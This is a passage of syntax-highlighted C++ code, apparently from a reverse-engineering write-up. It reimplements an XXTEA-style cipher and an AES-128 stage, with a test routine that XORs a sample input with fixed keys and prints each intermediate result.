class="number">0xCF</span>, <span class="number">0x95</span>, <span class="number">0x5E</span>, <span class="number">0x20</span>, <span class="number">0x94</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x9A</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0xE9</span>, <span class="number">0x2F</span>, <span class="number">0x51</span>, <span class="number">0x33</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x7C</span>, <span class="number">0xF5</span>, <span class="number">0x37</span>, <span class="number">0xAB</span>, <span class="number">0x09</span>, <span class="number">0x32</span>, <span class="number">0xB5</span>, <span class="number">0xFF</span>, <span class="number">0x4B</span>, <span class="number">0x7B</span>, <span class="number">0x53</span>, <span class="number">0xD5</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0xBF</span>, <span class="number">0xFA</span>, <span class="number">0x79</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x2A</span>, <span class="number">0x0E</span>, <span class="number">0x76</span>, <span class="number">0x94</span>, <span class="number">0xBA</span>, <span class="number">0xA8</span>, <span class="number">0xA1</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0xF4</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x85</span>, <span class="number">0x9C</span>, <span class="number">0x47</span>, <span class="number">0xCB</span>, <span class="number">0xF5</span>, <span class="number">0x52</span>, <span class="number">0x26</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x5F</span>, <span class="number">0xF0</span>, <span class="number">0x62</span>, <span class="number">0x80</span>, <span class="number">0x75</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0xB8</span>, <span class="number">0x5B</span>, <span class="number">0x0A</span>, <span class="number">0x4A</span>, <span class="number">0x6A</span>, <span class="number">0x56</span>, <span class="number">0xAA</span>, <span class="number">0x57</span>, <span class="number">0x01</span>, <span class="number">0xDA</span>, <span class="number">0xFB</span>, <span class="number">0x5A</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x7D</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x14</span>, <span class="number">0xC4</span>, <span class="number">0x68</span>, <span class="number">0xE5</span>, <span class="number">0xCF</span>, <span class="number">0x52</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xD9</span>, <span class="number">0x11</span>, <span class="number">0x74</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0x2E</span>, <span class="number">0xA5</span>, <span class="number">0x54</span>, <span class="number">0xCB</span>, <span class="number">0x5D</span>, <span class="number">0xB9</span>, <span class="number">0x36</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x0B</span>, <span class="number">0xA2</span>, <span class="number">0x65</span>, <span class="number">0x28</span>, <span class="number">0xCA</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0xEB</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0x6F</span>, <span class="number">0x5C</span>, <span class="number">0xAF</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x8B</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x3C</span>, <span class="number">0x66</span>, <span class="number">0x8A</span>, <span class="number">0x65</span>, <span class="number">0x1E</span>, <span class="number">0x34</span>, <span class="number">0xBC</span>, <span class="number">0x27</span>, <span class="number">0x36</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x01</span>, <span class="number">0xC7</span>, <span class="number">0xC8</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xE0</span>, <span class="number">0x9E</span>, <span class="number">0x2C</span>, <span class="number">0x91</span>, <span class="number">0xB0</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0xA5</span>, <span class="number">0xF2</span>, <span class="number">0xC4</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0xEC</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0xA3</span>, <span class="number">0x5D</span>, <span class="number">0x63</span>, <span class="number">0xF0</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x7A</span>, <span class="number">0x1C</span>, <span class="number">0x5E</span>, <span class="number">0x87</span>, <span class="number">0x11</span>, <span class="number">0x1B</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">f_inside</span><span class="params">(<span class="type">uint32_t</span> z, <span class="type">uint32_t</span> y, <span class="type">uint32_t</span> sum, <span class="type">int</span> p, <span class="type">const</span> <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xFFu</span>;</span><br><span class="line">    <span class="type">uint32_t</span> t1 = ((z &gt;&gt; <span class="number">3</span>) ^ (y &lt;&lt; <span class="number">6</span>));</span><br><span class="line">    <span class="type">uint32_t</span> t2 = ((y &gt;&gt; <span class="number">4</span>) ^ (z * <span class="number">32u</span>));</span><br><span class="line">    <span class="type">uint32_t</span> t3 = ((sum ^ y) + ((k[((p ^ e) &amp; <span class="number">3</span>)] ^ z)));</span><br><span class="line">    <span class="keyword">return</span> (t1 + t2) ^ t3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">g_last</span><span class="params">(<span class="type">uint32_t</span> z, <span class="type">uint32_t</span> y0, <span class="type">uint32_t</span> sum, <span class="type">int</span> p, <span class="type">const</span> <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xFFu</span>;</span><br><span class="line">    <span class="type">uint32_t</span> t1 = ((z &gt;&gt; <span class="number">4</span>) ^ (y0 * <span class="number">8u</span>));</span><br><span class="line">    <span class="type">uint32_t</span> t2 = ((y0 &gt;&gt; <span class="number">6</span>) ^ (z * <span class="number">4u</span>));</span><br><span class="line">    <span class="type">uint32_t</span> t3 = ((sum ^ y0) + ((k[((p ^ e) &amp; <span class="number">3</span>)] ^ z)));</span><br><span class="line">    <span class="keyword">return</span> (t1 + t2) ^ t3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">dec_round</span><span class="params">(<span class="type">uint32_t</span>* v_new, <span class="type">uint32_t</span> sum, <span class="type">const</span> <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> n = <span class="number">8</span>;</span><br><span class="line">    <span class="type">uint32_t</span> v_old[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    v_old[<span class="number">7</span>] = v_new[<span class="number">7</span>] - <span class="built_in">g_last</span>(v_new[<span class="number">6</span>], v_new[<span class="number">0</span>], sum, n - <span class="number">1</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> p = n - <span class="number">2</span>; p &gt;= <span class="number">1</span>; --p) &#123;</span><br><span class="line">        v_old[p] = v_new[p] - <span class="built_in">f_inside</span>(v_new[p - <span class="number">1</span>], v_old[p + <span class="number">1</span>], sum, p, k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v_old[<span class="number">0</span>] = v_new[<span class="number">0</span>] - <span class="built_in">f_inside</span>(v_old[<span class="number">7</span>], v_old[<span class="number">1</span>], sum, <span class="number">0</span>, k);</span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">memcpy</span>(v_new, v_old, <span class="built_in">sizeof</span>(v_old));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint8_t</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> key_bytes[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0xA4</span>, <span class="number">0x60</span>, <span class="number">0x78</span>, <span class="number">0x7B</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, <span class="number">0xEB</span>, <span class="number">0x54</span>,</span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0x9E</span>, <span class="number">0x7F</span>, <span class="number">0xFF</span>, <span class="number">0x27</span>, <span class="number">0xCA</span>, <span class="number">0x47</span>, <span class="number">0xBF</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>];</span><br><span class="line">    std::<span class="built_in">memcpy</span>(k, key_bytes, <span class="number">16</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> Delta = <span class="number">0x3CD46429</span>;<span class="comment">//0xE4D0C2B5;//0xBAE5A071u;</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>];</span><br><span class="line">    std::<span class="built_in">memcpy</span>(v, input, <span class="number">32</span>);</span><br><span class="line">    <span class="type">uint32_t</span> rounds = <span class="number">46</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = Delta * rounds;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> r = <span class="number">0</span>; r &lt; rounds; ++r) &#123;</span><br><span class="line">        <span class="built_in">dec_round</span>(v, sum, k);</span><br><span class="line">        sum -= Delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(input, v, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint8_t</span>* input_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD Delta = <span class="number">0xBAE5A071</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = &#123;</span><br><span class="line">        <span class="number">0xA4</span>, <span class="number">0x60</span>, <span class="number">0x78</span>, <span class="number">0x7B</span>, <span class="number">0x02</span>, <span class="number">0x54</span>, <span class="number">0xEB</span>, <span class="number">0x54</span>, <span class="number">0x35</span>, <span class="number">0x9E</span>, <span class="number">0x7F</span>, <span class="number">0xFF</span>, <span class="number">0x27</span>, <span class="number">0xCA</span>, <span class="number">0x47</span>, <span class="number">0xBF</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span>* v38 = (<span class="type">uint32_t</span>*)key;</span><br><span class="line">    <span class="type">uint32_t</span>* input = (<span class="type">uint32_t</span>*)input_;</span><br><span class="line">    <span class="comment">// v16 = v7 - 1;</span></span><br><span class="line">    <span class="type">int</span> v17 = <span class="number">46</span>;</span><br><span class="line">    DWORD Sum = <span class="number">0</span>;</span><br><span class="line">    DWORD v1&#123;&#125;;</span><br><span class="line">    DWORD v7 = <span class="number">8</span>;</span><br><span class="line">    DWORD v14 = v7 - <span class="number">1</span>;</span><br><span class="line">    v1 = input[v14];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        Sum += Delta;</span><br><span class="line">        DWORD v19 = Sum &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        DWORD count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v1 = input[count]</span><br><span class="line">                + ((((v1 &gt;&gt; <span class="number">3</span>) ^ (input[count + <span class="number">1</span>] &lt;&lt; <span class="number">6</span>)) + ((input[count + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) ^ (<span class="number">32</span> * v1)))</span><br><span class="line">                    ^ ((Sum ^ input[count + <span class="number">1</span>]) + (*((DWORD*)v38 + (((<span class="type">unsigned</span> __int8)count ^ (<span class="type">unsigned</span> __int8)v19) &amp; <span class="number">3</span>)) ^ v1)));</span><br><span class="line"></span><br><span class="line">            input[count++] = v1;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v14 != count);</span><br><span class="line">        v1 = input[v14] + ((((v1 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">8</span> * *input)) + ((*input &gt;&gt; <span class="number">6</span>) ^ (<span class="number">4</span> * v1))) ^ ((Sum ^ *input) + (*((DWORD*)v38 + (((<span class="type">uint8_t</span>)(v7 - <span class="number">1</span>) ^ (<span class="type">uint8_t</span>)v19) &amp; <span class="number">3</span>)) ^ v1)));</span><br><span class="line">        input[v14] = v1;</span><br><span class="line"></span><br><span class="line">        v17 = (<span class="type">unsigned</span> <span class="type">int</span>)(v17 - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((DWORD)v17);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> aes_key[<span class="number">176</span>] = &#123;</span><br><span class="line">    <span class="number">0xCF</span>, <span class="number">0x95</span>, <span class="number">0x5E</span>, <span class="number">0x20</span>, <span class="number">0x94</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x9A</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0xE9</span>, <span class="number">0x2F</span>, <span class="number">0x51</span>, <span class="number">0x33</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x7C</span>, <span class="number">0xF5</span>, <span class="number">0x37</span>, <span class="number">0xAB</span>, <span class="number">0x09</span>, <span class="number">0x32</span>, <span class="number">0xB5</span>, <span class="number">0xFF</span>, <span class="number">0x4B</span>, <span class="number">0x7B</span>, <span class="number">0x53</span>, <span class="number">0xD5</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0xBF</span>, <span class="number">0xFA</span>, <span class="number">0x79</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x2A</span>, <span class="number">0x0E</span>, <span class="number">0x76</span>, <span class="number">0x94</span>, <span class="number">0xBA</span>, <span class="number">0xA8</span>, <span class="number">0xA1</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0xF4</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x85</span>, <span class="number">0x9C</span>, <span class="number">0x47</span>, <span class="number">0xCB</span>, <span class="number">0xF5</span>, <span class="number">0x52</span>, <span class="number">0x26</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x5F</span>, <span class="number">0xF0</span>, <span class="number">0x62</span>, <span class="number">0x80</span>, <span class="number">0x75</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0xB8</span>, <span class="number">0x5B</span>, <span class="number">0x0A</span>, <span class="number">0x4A</span>, <span class="number">0x6A</span>, <span class="number">0x56</span>, <span class="number">0xAA</span>, <span class="number">0x57</span>, <span class="number">0x01</span>, <span class="number">0xDA</span>, <span class="number">0xFB</span>, <span class="number">0x5A</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x7D</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x14</span>, <span class="number">0xC4</span>, <span class="number">0x68</span>, <span class="number">0xE5</span>, <span class="number">0xCF</span>, <span class="number">0x52</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xD9</span>, <span class="number">0x11</span>, <span class="number">0x74</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0x2E</span>, <span class="number">0xA5</span>, <span class="number">0x54</span>, <span class="number">0xCB</span>, <span class="number">0x5D</span>, <span class="number">0xB9</span>, <span class="number">0x36</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, <span class="number">0x2B</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x0B</span>, <span class="number">0xA2</span>, <span class="number">0x65</span>, <span class="number">0x28</span>, <span class="number">0xCA</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0xEB</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0x6F</span>, <span class="number">0x5C</span>, <span class="number">0xAF</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x8B</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x3C</span>, <span class="number">0x66</span>, <span class="number">0x8A</span>, <span class="number">0x65</span>, <span class="number">0x1E</span>, <span class="number">0x34</span>, <span class="number">0xBC</span>, <span class="number">0x27</span>, <span class="number">0x36</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x01</span>, <span class="number">0xC7</span>, <span class="number">0xC8</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xE0</span>, <span class="number">0x9E</span>, <span class="number">0x2C</span>, <span class="number">0x91</span>, <span class="number">0xB0</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0xA5</span>, <span class="number">0xF2</span>, <span class="number">0xC4</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0xEC</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0xA3</span>, <span class="number">0x5D</span>, <span class="number">0x63</span>, <span class="number">0xF0</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x7A</span>, <span class="number">0x1C</span>, <span class="number">0x5E</span>, <span class="number">0x87</span>, <span class="number">0x11</span>, <span class="number">0x1B</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密同构</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maincs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> input[] = <span class="string">&quot;12341234123412341234123412341234&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">reverse</span>(input, input + <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey1[]&#123; <span class="number">0x0c</span>,<span class="number">0xa2</span>,<span class="number">0xd9</span>,<span class="number">0xf7</span>,<span class="number">0x95</span>,<span class="number">0x66</span>,<span class="number">0xa9</span>,<span class="number">0x0b</span>,<span class="number">0x35</span>,<span class="number">0xe9</span>,<span class="number">0x20</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0xda</span>,<span class="number">0x39</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x73</span>,<span class="number">0xc8</span>,<span class="number">0xa7</span>,<span class="number">0x07</span>,<span class="number">0x97</span>,<span class="number">0x55</span>,<span class="number">0xd9</span>,<span class="number">0x9c</span>,<span class="number">0xb3</span>,<span class="number">0x76</span>,<span class="number">0x88</span>,<span class="number">0x7d</span>,<span class="number">0x33</span>,<span class="number">0xa7</span>,<span class="number">0x0c</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey1[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey2[]&#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xb0</span>,<span class="number">0xcf</span>,<span class="number">0x4c</span>,<span class="number">0xed</span>,<span class="number">0x0e</span>,<span class="number">0xc1</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0xf2</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x3a</span>,<span class="number">0x35</span>,<span class="number">0xf2</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0xdc</span>,<span class="number">0xa1</span>,<span class="number">0x48</span>,<span class="number">0xe8</span>,<span class="number">0xde</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x90</span>,<span class="number">0xa3</span>,<span class="number">0x4d</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey2[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey3[]&#123; <span class="number">0xe9</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xfc</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0x1b</span>,<span class="number">0xe9</span>,<span class="number">0x21</span>,<span class="number">0x24</span>,<span class="number">0x64</span>,<span class="number">0x04</span>,<span class="number">0x29</span>,<span class="number">0x6f</span>,<span class="number">0x27</span>,<span class="number">0xaf</span>,<span class="number">0x7d</span>,<span class="number">0x4a</span>,<span class="number">0xad</span>,<span class="number">0xd6</span>,<span class="number">0x81</span>,<span class="number">0x11</span>,<span class="number">0xfa</span>,<span class="number">0x00</span>,<span class="number">0xe5</span>,<span class="number">0x6e</span>,<span class="number">0x00</span>,<span class="number">0xc8</span>,<span class="number">0xa5</span>,<span class="number">0x7c</span>,<span class="number">0x82</span>,<span class="number">0xf2</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey3[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey4[]&#123; <span class="number">0x00</span>,<span class="number">0x8c</span>,<span class="number">0xcd</span>,<span class="number">0x2e</span>,<span class="number">0x90</span>,<span class="number">0xb8</span>,<span class="number">0x00</span>,<span class="number">0x8a</span>,<span class="number">0x62</span>,<span class="number">0xd3</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0xcd</span>,<span class="number">0x32</span>,<span class="number">0x43</span>,<span class="number">0xfe</span>,<span class="number">0xed</span>,<span class="number">0xb6</span>,<span class="number">0xb2</span>,<span class="number">0xcc</span>,<span class="number">0xf1</span>,<span class="number">0xc3</span>,<span class="number">0x00</span>,<span class="number">0x5c</span>,<span class="number">0xa2</span>,<span class="number">0xa0</span>,<span class="number">0x00</span>,<span class="number">0xa5</span>,<span class="number">0x2d</span>,<span class="number">0xc4</span>,<span class="number">0x3e</span>,<span class="number">0x64</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey4[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey5[]&#123; <span class="number">0x35</span>,<span class="number">0xfb</span>,<span class="number">0x03</span>,<span class="number">0x2b</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x1a</span>,<span class="number">0x27</span>,<span class="number">0x6f</span>,<span class="number">0x5a</span>,<span class="number">0x5d</span>,<span class="number">0x24</span>,<span class="number">0x0b</span>,<span class="number">0x26</span>,<span class="number">0xac</span>,<span class="number">0x83</span>,<span class="number">0x67</span>,<span class="number">0x60</span>,<span class="number">0xaf</span>,<span class="number">0x19</span>,<span class="number">0x00</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0xe0</span>,<span class="number">0xf2</span>,<span class="number">0xc0</span>,<span class="number">0xa7</span>,<span class="number">0xde</span>,<span class="number">0x22</span>,<span class="number">0xa9</span>,<span class="number">0x53</span>,<span class="number">0xa1</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey5[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input<span class="number">+16</span>, input<span class="number">+16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey6[]&#123; <span class="number">0xa0</span>,<span class="number">0x90</span>,<span class="number">0xf8</span>,<span class="number">0x5f</span>,<span class="number">0x29</span>,<span class="number">0x1c</span>,<span class="number">0x5b</span>,<span class="number">0xb8</span>,<span class="number">0x7c</span>,<span class="number">0xad</span>,<span class="number">0x04</span>,<span class="number">0x6b</span>,<span class="number">0xe7</span>,<span class="number">0xfa</span>,<span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0xe7</span>,<span class="number">0x48</span>,<span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0x1f</span>,<span class="number">0xce</span>,<span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x8d</span>,<span class="number">0x1d</span>,<span class="number">0xfb</span>,<span class="number">0x21</span>,<span class="number">0x8c</span>,<span class="number">0x5d</span>,<span class="number">0x87</span>,<span class="number">0xa6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey6[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey7[]&#123; <span class="number">0xdd</span>,<span class="number">0xf6</span>,<span class="number">0x83</span>,<span class="number">0x62</span>,<span class="number">0x12</span>,<span class="number">0x66</span>,<span class="number">0x7d</span>,<span class="number">0xca</span>,<span class="number">0x2e</span>,<span class="number">0xca</span>,<span class="number">0x13</span>,<span class="number">0x93</span>,<span class="number">0xa7</span>,<span class="number">0x3e</span>,<span class="number">0x55</span>,<span class="number">0xab</span>,<span class="number">0x23</span>,<span class="number">0x7f</span>,<span class="number">0xe2</span>,<span class="number">0x92</span>,<span class="number">0xe6</span>,<span class="number">0x78</span>,<span class="number">0xb7</span>,<span 